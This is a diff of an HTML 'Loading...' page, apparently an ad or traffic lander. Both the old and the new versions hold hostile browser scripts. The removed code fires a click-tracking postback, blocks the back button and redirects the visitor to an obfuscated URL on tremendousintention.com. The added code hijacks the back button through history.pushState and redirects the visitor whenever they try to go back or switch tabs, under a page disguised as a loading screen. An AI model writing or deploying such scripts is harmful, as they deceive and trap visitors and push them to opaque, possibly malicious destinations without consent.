@@ -6,6 +6,16 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G03NHX4D9G"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-G03NHX4D9G');
+</script>
+
 <title>Loading...</title>
 
 <style>
@@ -28,64 +38,21 @@ body {
 Preparing content… please wait
 
 <script>
-(function () {
+var target = "https://tremendousintention.com/b.3UVb0-PL3SpJvbbzmlVGJ/Z/D/0J2QNNzEAQ5FOuTsIJ1eL/T/Yc3HM/Dqk-5rMtjmYx";
 
-const TARGET_URL = "https://tremendousintention.com/b.3GVH0MPh3/pGv/bwmqVxJbZfDs0U2ONlzCAK5sO/T/Iq1yLsTTY/3_MzDKkd5WMHjRYl";
-const REDIRECT_DELAY = 1500;
+history.pushState({}, "", location.href);
+history.pushState({}, "", location.href);
 
-window.addEventListener("load", function () {
-
-/* ========================= 
-POSTBACK 
-========================= */
-const params = new URLSearchParams(window.location.search);
-
-const clickId = 
- params.get("ctoken") ||
- params.get("clickId") ||
- params.get("click_id") ||
- params.get("cid");
-
-if (clickId) {
- const postbackUrl = "https://trackhta.com/close/?token=" + encodeURIComponent(clickId) + "&advertiserId=341547";
- 
- if (navigator.sendBeacon) {
-  navigator.sendBeacon(postbackUrl);
- } else {
-  fetch(postbackUrl, { keepalive: true }).catch(() => {});
- }
-} else {
- console.warn("Click ID tidak ditemukan, postback dibatalkan.");
-}
-
-/* ========================= 
-ANTI BACK BUTTON 
-========================= */
-history.pushState(null, "", location.href);
 window.addEventListener("popstate", function () {
- history.pushState(null, "", location.href);
+    window.location.replace(target);
 });
 
-/* ========================= 
-REDIRECT 
-========================= */
-setTimeout(function () {
- location.replace(TARGET_URL);
-}, REDIRECT_DELAY);
-
+document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") {
+        window.location.href = target;
+    }
 });
-
-})();
 </script>
-
-<noscript>
-<p>
-JavaScript is disabled.
-<a href="https://tremendousintention.com/b.3GVH0MPh3/pGv/bwmqVxJbZfDs0U2ONlzCAK5sO/T/Iq1yLsTTY/3_MzDKkd5WMHjRYl">
-Click here to continue
-</a>
-</p>
-</noscript>
 
 </body>
 </html>
